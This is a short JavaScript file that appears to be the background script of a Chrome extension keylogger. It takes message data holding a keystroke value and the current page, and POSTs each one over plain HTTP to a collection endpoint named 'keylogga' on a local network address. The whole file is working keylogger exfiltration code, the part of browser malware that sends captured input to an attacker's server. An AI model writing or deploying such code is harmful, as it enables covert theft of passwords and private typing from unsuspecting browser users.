function handleMessage(request) {

  // console.log("Received data:", request);
  // console.log(request.key);
  // console.log(request.page);

  data = "key=" + request.key+ "&page=" + request.page;
  console.log("Sending data:", data);

  var x = new XMLHttpRequest();
  x.onload = function () {
    console.log("Server response:", this.responseText);
  };

  x.open("POST", "http://192.168.0.10/keylogga/", true);
  x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  x.send(data);

}

chrome.runtime.onMessage.addListener(handleMessage);
